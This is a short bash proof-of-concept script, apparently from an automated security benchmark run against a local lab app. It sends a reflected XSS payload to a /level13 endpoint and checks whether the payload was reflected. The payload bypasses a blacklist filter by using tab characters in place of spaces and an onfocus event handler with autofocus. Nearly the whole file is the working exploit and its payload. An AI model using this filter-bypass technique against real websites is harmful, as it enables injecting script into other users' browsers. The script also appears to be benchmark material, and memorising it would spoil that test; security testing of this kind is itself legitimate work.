#!/bin/bash
# POC: Demonstrates XSS bypass via onfocus event handler with tab whitespace on /level13 endpoint. Uses %09 (tab character) to bypass space blacklist and onfocus event handler which is not blacklisted.
# Target: ./repo
# Created: 2025-11-04T17:04:55.059Z
# Session: benchmark-XBEN-016-24-mhkt6d0m

# XSS Bypass via onfocus Event Handler with Tab Whitespace
# Target: /level13 endpoint with blacklist-based XSS filter
# Bypass technique: Use tab characters (%09) and onfocus event handler

TARGET_URL="http://localhost:5000/level13"

# Payload: ><img%09src=x%09onfocus=alert("XSS")%09autofocus>
# URL encoded payload
PAYLOAD="%3E%3Cimg%09src=x%09onfocus=alert%28%22XSS%22%29%09autofocus%3E"

echo "[*] Testing XSS Bypass via onfocus Event Handler with Tab Whitespace"
echo "[*] Target URL: $TARGET_URL"
echo "[*] Payload: ><img%09src=x%09onfocus=alert(\"XSS\")%09autofocus>"
echo ""

# Send the request
echo "[*] Sending request with XSS payload..."
RESPONSE=$(curl -s "$TARGET_URL?name=$PAYLOAD")

echo "[*] Response received (first 500 chars):"
echo "$RESPONSE" | head -c 500
echo ""
echo ""

# Check if the payload is reflected in the response (unfiltered)
if echo "$RESPONSE" | grep -q "onfocus"; then
    echo "[+] SUCCESS: XSS payload bypassed filters and reflected in response!"
    echo "[+] Vulnerability confirmed: onfocus event handler is not blacklisted"
    echo "[+] Tab characters (%09) successfully bypass space blacklist"
    echo "[+] This allows arbitrary JavaScript execution with autofocus attribute"
    echo ""
    echo "[*] Full response containing payload:"
    echo "$RESPONSE" | grep -o '><img[^<]*' || echo "$RESPONSE"
    exit 0
else
    echo "[-] FAILED: Payload was filtered or not reflected"
    echo "[-] Full response:"
    echo "$RESPONSE"
    exit 1
fi